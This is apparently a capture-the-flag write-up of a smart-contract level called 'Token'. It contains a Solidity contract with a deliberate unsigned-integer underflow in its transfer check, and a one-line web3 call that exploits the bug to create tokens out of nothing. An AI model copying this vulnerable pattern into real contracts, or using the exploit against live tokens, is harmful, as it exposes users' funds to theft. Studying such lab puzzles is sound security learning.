## Token

### Contract

<details><summary>CLICK TO VIEW</summary>
<p>

```solidity
/ SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

</p>
</details>

### Solution

This was actually super easy as I'm used to unsigned ints (overflows and underflows). Essentially the BIIIG mistake (there are multiple but heck) lies here:

```solidity
require(balances[msg.sender] - _value >= 0);
balances[msg.sender] -= _value;
```

In a nutshell, we can underflow the integer by providing a value superior to the balance (eg 21). This will result in a positive result, hence we can literally 
print tokens out of nowhere.

Here's the javascript web3 line:

```javascript
contract.transfer(instance, 21);
```

And that's our next problem solved
